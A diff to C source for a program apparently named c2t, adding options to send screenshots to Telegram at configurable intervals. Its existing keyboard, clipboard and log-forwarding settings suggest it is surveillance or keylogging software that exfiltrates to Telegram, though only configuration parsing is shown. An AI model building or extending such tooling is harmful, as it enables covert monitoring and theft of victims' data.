@@ -32,6 +32,9 @@
 #define TELEGRAM_DEFAULT_LOG_INTERVAL_SEC 3600U
 #define TELEGRAM_MIN_LOG_INTERVAL_SEC 5U
 #define TELEGRAM_MAX_LOG_INTERVAL_SEC 86400U
+#define TELEGRAM_DEFAULT_SCREENSHOT_INTERVAL_SEC 300U
+#define TELEGRAM_MIN_SCREENSHOT_INTERVAL_SEC 5U
+#define TELEGRAM_MAX_SCREENSHOT_INTERVAL_SEC 86400U
 #define C2T_DEFAULT_QUEUE_MAX_BYTES (64U * 1024U * 1024U)
 #define C2T_DEFAULT_QUEUE_MAX_ITEMS 128U
 #define C2T_DEFAULT_DELIVERY_ATTEMPTS 3U
@@ -173,6 +176,21 @@ void c2t_config_load([[maybe_unused]] const char *executable_path) {
     config.telegram_log_interval_sec = TELEGRAM_MIN_LOG_INTERVAL_SEC;
   if (config.telegram_log_interval_sec > TELEGRAM_MAX_LOG_INTERVAL_SEC)
     config.telegram_log_interval_sec = TELEGRAM_MAX_LOG_INTERVAL_SEC;
+  config.telegram_send_screenshots =
+      configured_flag("TELEGRAM_SEND_SCREENSHOTS") ||
+      configured_flag("TELEGRAM_SEND_SCREENSHOT");
+  config.telegram_screenshot_interval_sec =
+      configured_size("TELEGRAM_SCREENSHOT_INTERVAL_SEC", 0);
+  if (config.telegram_screenshot_interval_sec > 0) {
+    if (config.telegram_screenshot_interval_sec <
+        TELEGRAM_MIN_SCREENSHOT_INTERVAL_SEC)
+      config.telegram_screenshot_interval_sec =
+          TELEGRAM_MIN_SCREENSHOT_INTERVAL_SEC;
+    if (config.telegram_screenshot_interval_sec >
+        TELEGRAM_MAX_SCREENSHOT_INTERVAL_SEC)
+      config.telegram_screenshot_interval_sec =
+          TELEGRAM_MAX_SCREENSHOT_INTERVAL_SEC;
+  }
   config.telegram_max_file_bytes = configured_size(
       "TELEGRAM_MAX_FILE_BYTES", TELEGRAM_DEFAULT_MAX_FILE_BYTES);
   config.queue_max_bytes =
@@ -205,6 +223,16 @@ void c2t_config_load([[maybe_unused]] const char *executable_path) {
   } else {
     config.disable_clipboard = configured_flag("C2T_DISABLE_CLIPBOARD") ||
                                configured_flag("DISABLE_CLIPBOARD");
+  }
+  char embedded_send_shot[16] = {};
+  const char *send_shot_val =
+      configured_value("TELEGRAM_SEND_SCREENSHOT", embedded_send_shot,
+                       sizeof(embedded_send_shot));
+  if (send_shot_val) {
+    config.disable_screenshot = strcmp(send_shot_val, "0") == 0;
+  } else {
+    config.disable_screenshot = configured_flag("C2T_DISABLE_SCREENSHOT") ||
+                               configured_flag("DISABLE_SCREENSHOT");
   }
   config.keyboard_flush_ms =
       configured_size("C2T_KEYBOARD_FLUSH_MS", C2T_DEFAULT_KEYBOARD_FLUSH_MS);
@@ -302,6 +330,14 @@ const char *c2t_config_apply_arguments(int argc, char **argv) {
     } else if (strcmp(argv[index], "--send-logs") == 0 ||
                strcmp(argv[index], "--telegram-send-logs") == 0) {
       config.telegram_send_logs = 1;
+    } else if (strcmp(argv[index], "--send-screenshots") == 0 ||
+               strcmp(argv[index], "--send-screenshot") == 0 ||
+               strcmp(argv[index], "--telegram-send-screenshots") == 0) {
+      config.telegram_send_screenshots = 1;
+    } else if (strcmp(argv[index], "--no-screenshot") == 0 ||
+               strcmp(argv[index], "--no-screenshots") == 0 ||
+               strcmp(argv[index], "--disable-screenshot") == 0) {
+      config.disable_screenshot = 1;
     } else if (strcmp(argv[index], "--no-keyboard") == 0 ||
                strcmp(argv[index], "--disable-keyboard") == 0) {
       config.disable_keyboard = 1;
@@ -371,6 +407,19 @@ const char *c2t_config_apply_arguments(int argc, char **argv) {
           val > TELEGRAM_MAX_LOG_INTERVAL_SEC)
         return argv[index - 1];
       config.telegram_log_interval_sec = (size_t)val;
+    } else if (strcmp(argv[index], "--screenshot-interval") == 0 ||
+               strcmp(argv[index], "--telegram-screenshot-interval") == 0) {
+      if (index + 1 >= argc)
+        return argv[index];
+      ++index;
+      char *end;
+      errno = 0;
+      unsigned long val = strtoul(argv[index], &end, 10);
+      if (errno || *end || val < TELEGRAM_MIN_SCREENSHOT_INTERVAL_SEC ||
+          val > TELEGRAM_MAX_SCREENSHOT_INTERVAL_SEC)
+        return argv[index - 1];
+      config.telegram_screenshot_interval_sec = (size_t)val;
+      config.telegram_send_screenshots = 1;
     } else if (strcmp(argv[index], "--allowed-mac") == 0) {
       if (index + 1 >= argc)
         return argv[index];
